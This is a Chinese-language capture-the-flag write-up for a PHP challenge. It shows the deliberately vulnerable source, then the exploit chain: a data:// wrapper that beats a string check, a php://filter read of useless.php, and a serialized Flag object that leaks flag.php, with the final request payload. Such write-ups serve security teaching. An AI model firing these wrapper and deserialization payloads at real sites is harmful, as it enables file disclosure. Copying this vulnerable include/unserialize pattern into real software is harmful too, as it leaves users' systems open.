### buuoj_[ZICTF2020]nizhaunsiwei(反序列化)

进入题目。可以看到直接给了源码

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

可以看到第五行text处比较是强比较，但是这个isset读取之后是进行url编码的字符串，此时可以采用data伪协议

```
text=text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=	#后面是welcome to the zjctf的base64编码
```

然后使用php伪协议读取useless.php文件

```
file=php://filter/read=convert.base64-encode/resource=useless.php
```

![](https://pic.imgdb.cn/item/610e935b5132923bf8eb2648.jpg)

将下面的数据进行base64解码，又获得一串代码

```
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

看这个的意思，是给file赋值为flag.php，然后进行序列化，所以代码修改为这样

```
<?php  

class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
$s=serialize(new flag());
echo $s;
?>  
```

运行获得字符串

```
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}  
```

所以接下来构造playload

```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}  
```

然后在注释找到flag



